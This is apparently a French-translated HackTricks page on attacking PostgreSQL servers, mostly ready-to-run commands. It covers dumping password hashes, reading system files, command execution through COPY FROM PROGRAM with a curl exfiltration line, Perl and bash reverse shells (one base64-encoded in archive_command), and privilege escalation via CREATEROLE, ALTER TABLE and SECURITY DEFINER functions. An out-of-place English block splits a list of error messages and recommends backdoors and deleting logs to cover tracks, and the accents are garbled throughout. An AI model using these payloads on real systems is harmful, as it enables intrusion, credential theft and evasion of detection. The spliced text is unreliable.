# 5432,5433 - Test d'intrusion PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informations de base**

**PostgreSQL** est d√©crit comme un **syst√®me de base de donn√©es objet-relationnel** qui est **open source**. Ce syst√®me n'utilise pas seulement le langage SQL mais l'am√©liore √©galement avec des fonctionnalit√©s suppl√©mentaires. Ses capacit√©s lui permettent de g√©rer une large gamme de types de donn√©es et d'op√©rations, en en faisant un choix polyvalent pour les d√©veloppeurs et les organisations.

**Port par d√©faut :** 5432, et si ce port est d√©j√† utilis√©, il semble que PostgreSQL utilisera le port suivant (5433 probablement) qui n'est pas utilis√©.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connexion & √ânum√©ration de base
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Si en ex√©cutant **`\list`** vous trouvez une base de donn√©es appel√©e **`rdsadmin`**, vous savez que vous √™tes √† l'int√©rieur d'une **base de donn√©es PostgreSQL AWS**.
{% endhint %}

Pour plus d'informations sur **comment abuser d'une base de donn√©es PostgreSQL**, consultez :

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## √ânum√©ration Automatique
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Analyse de ports**

Selon [**cette recherche**](https://www.exploit-db.com/papers/13084), lorsqu'une tentative de connexion √©choue, `dblink` lance une exception `sqlclient_unable_to_establish_sqlconnection` incluant une explication de l'erreur. Des exemples de ces d√©tails sont √©num√©r√©s ci-dessous.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* L'h√¥te est hors ligne

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

* Le port est ferm√©
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Le port est ouvert
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```md
## PostgreSQL

### Enumeration

When conducting a PostgreSQL pentest, start by identifying the version of the PostgreSQL server running on the target system. This can be done by querying the `version()` function or checking the service banner.

```sql
SELECT version();
```

### Default Credentials

PostgreSQL does not set default credentials during installation. However, it's common for users to set weak or easily guessable passwords. Always check for default credentials or weak passwords during your pentest.

### Information Gathering

Use tools like `pg_dump` to extract information from the database. This can help you gather valuable data such as table structures, user information, and more.

```bash
pg_dump -U username -d database_name > dump.sql
```

### Exploitation

Look for common vulnerabilities like SQL injection or insecure configurations that could allow unauthorized access to the database. Exploit these vulnerabilities to gain access to sensitive data.

### Post-Exploitation

After gaining access to the database, look for ways to maintain access or escalate privileges. This could involve creating backdoors, adding new users, or modifying existing data.

### Covering Tracks

Finally, ensure that you cover your tracks by deleting any logs or evidence of your activities on the PostgreSQL server to avoid detection.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Le port est ouvert ou filtr√©
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Dans les fonctions PL/pgSQL, il n'est actuellement pas possible d'obtenir les d√©tails des exceptions. Cependant, si vous avez un acc√®s direct au serveur PostgreSQL, vous pouvez r√©cup√©rer les informations n√©cessaires. Si l'extraction des noms d'utilisateur et des mots de passe √† partir des tables syst√®me n'est pas r√©alisable, vous pouvez envisager d'utiliser la m√©thode d'attaque par liste de mots discut√©e dans la section pr√©c√©dente, car elle pourrait potentiellement donner des r√©sultats positifs.

## √ânum√©ration des privil√®ges

### R√¥les

| Types de r√¥les |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Le r√¥le a des privil√®ges de superutilisateur                                                                                                         |
| rolinherit     | Le r√¥le h√©rite automatiquement des privil√®ges des r√¥les dont il est membre                                                                            |
| rolcreaterole  | Le r√¥le peut cr√©er d'autres r√¥les                                                                                                                    |
| rolcreatedb    | Le r√¥le peut cr√©er des bases de donn√©es                                                                                                              |
| rolcanlogin    | Le r√¥le peut se connecter. C'est-√†-dire que ce r√¥le peut √™tre donn√© en tant qu'identifiant d'autorisation de session initial                        |
| rolreplication | Le r√¥le est un r√¥le de r√©plication. Un r√¥le de r√©plication peut initier des connexions de r√©plication et cr√©er et supprimer des emplacements de r√©plication. |
| rolconnlimit   | Pour les r√¥les pouvant se connecter, cela d√©finit le nombre maximal de connexions simultan√©es que ce r√¥le peut √©tablir. -1 signifie aucune limite.     |
| rolpassword    | Pas le mot de passe (toujours affich√© comme `********`)                                                                                                |
| rolvaliduntil  | Heure d'expiration du mot de passe (utilis√©e uniquement pour l'authentification par mot de passe) ; null s'il n'y a pas d'expiration                   |
| rolbypassrls   | Le r√¥le contourne chaque strat√©gie de s√©curit√© au niveau des lignes, voir [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) pour plus d'informations. |
| rolconfig      | Valeurs par d√©faut sp√©cifiques au r√¥le pour les variables de configuration √† l'ex√©cution                                                           |
| oid            | ID du r√¥le                                                                                                                                          |

#### Groupes int√©ressants

* Si vous √™tes membre de **`pg_execute_server_program`** vous pouvez **ex√©cuter** des programmes
* Si vous √™tes membre de **`pg_read_server_files`** vous pouvez **lire** des fichiers
* Si vous √™tes membre de **`pg_write_server_files`** vous pouvez **√©crire** des fichiers

{% hint style="info" %}
Notez que dans Postgres un **utilisateur**, un **groupe** et un **r√¥le** sont les **m√™mes**. Cela d√©pend simplement de la mani√®re dont vous l'utilisez et si vous **l'autorisez √† se connecter**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tables

Les tables dans une base de donn√©es PostgreSQL peuvent contenir des donn√©es sensibles telles que des informations d'identification, des donn√©es personnelles, etc. Lors de l'√©valuation de la s√©curit√© d'une base de donn√©es PostgreSQL, il est important de v√©rifier les autorisations d'acc√®s aux tables, les privil√®ges des utilisateurs et les vuln√©rabilit√©s potentielles telles que les injections SQL.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonctions
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Actions sur le syst√®me de fichiers

### Lire les r√©pertoires et les fichiers

√Ä partir de ce [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), les membres du groupe d√©fini **`DEFAULT_ROLE_READ_SERVER_FILES`** (appel√© **`pg_read_server_files`**) et les **super utilisateurs** peuvent utiliser la m√©thode **`COPY`** sur n'importe quel chemin (consultez `convert_and_check_filename` dans `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
N'oubliez pas que si vous n'√™tes pas un super utilisateur mais avez les autorisations **CREATEROLE**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_read_server_files TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Il existe **d'autres fonctions postgres** qui peuvent √™tre utilis√©es pour **lire un fichier ou lister un r√©pertoire**. Seuls les **superutilisateurs** et les **utilisateurs avec des autorisations explicites** peuvent les utiliser:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Vous pouvez trouver **plus de fonctions** dans [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### √âcriture de fichiers simple

Seuls les **super utilisateurs** et les membres de **`pg_write_server_files`** peuvent utiliser la copie pour √©crire des fichiers.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Rappelez-vous que si vous n'√™tes pas super utilisateur mais avez les autorisations **`CREATEROLE`**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_write_server_files TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

N'oubliez pas que COPY ne peut pas g√©rer les caract√®res de nouvelle ligne, donc m√™me si vous utilisez une charge utile en base64, **vous devez envoyer une seule ligne**.\
Une limitation tr√®s importante de cette technique est que **`copy` ne peut pas √™tre utilis√© pour √©crire des fichiers binaires car il modifie certaines valeurs binaires.**

### **T√©l√©chargement de fichiers binaires**

Cependant, il existe **d'autres techniques pour t√©l√©charger de gros fichiers binaires:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Conseil de prime de bug**: **inscrivez-vous** √† **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des hackers, pour des hackers! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE vers un programme**

Depuis [la version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), seuls les **super utilisateurs** et les membres du groupe **`pg_execute_server_program`** peuvent utiliser copy pour RCE (exemple avec exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemple √† ex√©cuter:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
N'oubliez pas que si vous n'√™tes pas un super utilisateur mais avez les autorisations **`CREATEROLE`**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_execute_server_program TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ou utilisez le module `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Plus d'informations sur cette vuln√©rabilit√© [**ici**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Alors que signal√© comme CVE-2019-9193, Postges a d√©clar√© que c'√©tait une [fonctionnalit√© et ne sera pas corrig√©e](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE avec les langages PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE avec les extensions PostgreSQL

Une fois que vous avez **appris** du post pr√©c√©dent **comment t√©l√©charger des fichiers binaires**, vous pourriez essayer d'obtenir **une ex√©cution de code √† distance en t√©l√©chargeant une extension postgresql et en la chargeant**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE avec le fichier de configuration PostgreSQL

Le **fichier de configuration** de postgresql est **modifiable** par l'utilisateur **postgres** qui ex√©cute la base de donn√©es, donc en tant que **superutilisateur** vous pouvez √©crire des fichiers dans le syst√®me de fichiers, et donc vous pouvez **√©craser ce fichier.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE avec ssl\_passphrase\_command**

Plus d'informations [sur cette technique ici](https://pulsesecurity.co.nz/articles/postgres-sqli).

Le fichier de configuration a quelques attributs int√©ressants qui peuvent conduire √† une RCE :

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Chemin de la cl√© priv√©e de la base de donn√©es
* `ssl_passphrase_command = ''` Si le fichier priv√© est prot√©g√© par un mot de passe (chiffr√©), postgresql **ex√©cutera la commande indiqu√©e dans cet attribut**.
* `ssl_passphrase_command_supports_reload = off` **Si** cet attribut est **activ√©**, la **commande** ex√©cut√©e si la cl√© est prot√©g√©e par un mot de passe **sera ex√©cut√©e** lorsque `pg_reload_conf()` est **ex√©cut√©**.

Ensuite, un attaquant devra :

1. **Extraire la cl√© priv√©e** du serveur
2. **Chiffrer** la cl√© priv√©e t√©l√©charg√©e :
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **√âcraser**
4. **Extraire** la **configuration** actuelle de postgresql
5. **√âcraser** la **configuration** avec la configuration des attributs mentionn√©s :
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ex√©cuter `pg_reload_conf()`

En testant ceci, j'ai remarqu√© que cela ne fonctionnera que si le **fichier de cl√© priv√©e a des privil√®ges 640**, qu'il est **poss√©d√© par root** et par le **groupe ssl-cert ou postgres** (pour que l'utilisateur postgres puisse le lire), et est plac√© dans _/var/lib/postgresql/12/main_.

#### **RCE avec archive\_command**

**Plus** [**d'informations sur cette configuration et sur WAL ici**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Un autre attribut dans le fichier de configuration qui est exploitable est `archive_command`.

Pour que cela fonctionne, le param√®tre `archive_mode` doit √™tre `'on'` ou `'always'`. Si c'est le cas, alors nous pourrions √©craser la commande dans `archive_command` et la forcer √† s'ex√©cuter via les op√©rations WAL (write-ahead logging).

Les √©tapes g√©n√©rales sont :

1. V√©rifiez si le mode archive est activ√© : `SELECT current_setting('archive_mode')`
2. √âcrasez `archive_command` avec la charge utile. Par exemple, un shell invers√© : `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Rechargez la configuration : `SELECT pg_reload_conf()`
4. Forcer l'op√©ration WAL √† s'ex√©cuter, ce qui appellera la commande d'archivage : `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` pour certaines versions de Postgres

## **√âl√©vation de privil√®ges Postgres**

### √âl√©vation de privil√®ges CREATEROLE

#### **Accorder**

Selon la [**documentation**](https://www.postgresql.org/docs/13/sql-grant.html) : _Les r√¥les ayant le privil√®ge **`CREATEROLE`** peuvent **accorder ou r√©voquer l'appartenance √† n'importe quel r√¥le** qui n'est pas un **superutilisateur**._

Donc, si vous avez la permission **`CREATEROLE`**, vous pourriez vous accorder l'acc√®s √† d'autres **r√¥les** (qui ne sont pas superutilisateurs) qui peuvent vous donner la possibilit√© de lire et √©crire des fichiers et d'ex√©cuter des commandes :
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifier le mot de passe

Les utilisateurs de ce r√¥le peuvent √©galement **modifier** les **mots de passe** d'autres **non-superutilisateurs**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### √âl√©vation de privil√®ges vers SUPERUSER

Il est assez courant de constater que **les utilisateurs locaux peuvent se connecter √† PostgreSQL sans fournir de mot de passe**. Par cons√©quent, une fois que vous avez obtenu **les autorisations pour ex√©cuter du code**, vous pouvez abuser de ces autorisations pour obtenir le r√¥le de **`SUPERUSER`** :
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Cela est g√©n√©ralement possible en raison des lignes suivantes dans le fichier **`pg_hba.conf`** :
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

Dans [**cette analyse**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities), il est expliqu√© comment il √©tait possible de r√©aliser une **√©l√©vation de privil√®ges** dans Postgres GCP en abusant du privil√®ge ALTER TABLE qui avait √©t√© accord√© √† l'utilisateur.

Lorsque vous essayez de **changer le propri√©taire d'une table pour un autre utilisateur**, vous devriez normalement obtenir une **erreur** vous en emp√™chant, mais apparemment GCP a donn√© cette **option √† l'utilisateur postgres non-superutilisateur** dans GCP :

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

En associant cette id√©e au fait que lorsque les commandes **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) sont ex√©cut√©es sur une **table avec une fonction d'index**, la **fonction** est **appel√©e** dans le cadre de la commande avec les **permissions du propri√©taire de la table**. Il est possible de cr√©er un index avec une fonction, donner les permissions de propri√©taire √† un **superutilisateur** sur cette table, puis ex√©cuter ANALYZE sur la table avec la fonction malveillante qui pourra ex√©cuter des commandes car elle utilise les privil√®ges du propri√©taire.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Commencez par cr√©er une nouvelle table.
2. Ins√©rez un contenu non pertinent dans la table pour fournir des donn√©es √† la fonction d'index.
3. D√©veloppez une fonction d'index malveillante contenant une charge utile d'ex√©cution de code, permettant l'ex√©cution de commandes non autoris√©es.
4. MODIFIEZ le propri√©taire de la table en "cloudsqladmin", qui est le r√¥le superutilisateur de GCP exclusivement utilis√© par Cloud SQL pour g√©rer et maintenir la base de donn√©es.
5. Effectuez une op√©ration ANALYZE sur la table. Cette action contraint le moteur PostgreSQL √† passer au contexte utilisateur du propri√©taire de la table, "cloudsqladmin". Par cons√©quent, la fonction d'index malveillante est appel√©e avec les autorisations de "cloudsqladmin", permettant ainsi l'ex√©cution de la commande shell pr√©c√©demment non autoris√©e.

Dans PostgreSQL, ce flux ressemble √† ceci :
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ensuite, la table `shell_commands_results` contiendra la sortie du code ex√©cut√© :
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Connexion Locale

Certaines instances de postgresql mal configur√©es pourraient autoriser la connexion de n'importe quel utilisateur local, il est possible de se connecter localement depuis 127.0.0.1 en utilisant la fonction **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Notez que pour que la requ√™te pr√©c√©dente fonctionne **la fonction `dblink` doit exister**. Si ce n'est pas le cas, vous pouvez essayer de la cr√©er avec
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Si vous avez le mot de passe d'un utilisateur avec plus de privil√®ges, mais que l'utilisateur n'est pas autoris√© √† se connecter depuis une adresse IP externe, vous pouvez utiliser la fonction suivante pour ex√©cuter des requ√™tes en tant qu'utilisateur :
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Il est possible de v√©rifier si cette fonction existe avec :
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### Fonction d√©finie personnalis√©e avec SECURITY DEFINER

[**Dans ce document**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), les testeurs ont pu obtenir des privil√®ges √©lev√©s √† l'int√©rieur d'une instance postgres fournie par IBM, car ils **ont trouv√© cette fonction avec le drapeau SECURITY DEFINER** :

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Comme [**expliqu√© dans la documentation**](https://www.postgresql.org/docs/current/sql-createfunction.html), une fonction avec **SECURITY DEFINER est ex√©cut√©e** avec les privil√®ges de l'**utilisateur qui la poss√®de**. Par cons√©quent, si la fonction est **vuln√©rable √† l'injection SQL** ou effectue des **actions privil√©gi√©es avec des param√®tres contr√¥l√©s par l'attaquant**, elle pourrait √™tre exploit√©e pour **escalader les privil√®ges √† l'int√©rieur de postgres**.

√Ä la ligne 4 du code pr√©c√©dent, vous pouvez voir que la fonction a le drapeau **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Et ensuite **ex√©cutez des commandes** :

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Contourner la force brute avec PL/pgSQL

**PL/pgSQL** est un **langage de programmation complet** qui offre un plus grand contr√¥le proc√©dural par rapport au SQL. Il permet l'utilisation de **boucles** et d'autres **structures de contr√¥le** pour am√©liorer la logique du programme. De plus, les **instructions SQL** et les **d√©clencheurs** ont la capacit√© d'invoquer des fonctions cr√©√©es √† l'aide du **langage PL/pgSQL**. Cette int√©gration permet une approche plus compl√®te et polyvalente de la programmation et de l'automatisation de la base de donn√©es.\
**Vous pouvez abuser de ce langage pour demander √† PostgreSQL de forcer les identifiants des utilisateurs.** 

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### journalisation

√Ä l'int√©rieur du fichier _**postgresql.conf**_, vous pouvez activer les journaux postgresql en modifiant :
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ensuite, **red√©marrez le service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) est une plateforme d'administration et de d√©veloppement pour PostgreSQL.\
Vous pouvez trouver des **mots de passe** √† l'int√©rieur du fichier _**pgadmin4.db**_\
Vous pouvez les d√©crypter en utilisant la fonction _**decrypt**_ dans le script : [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

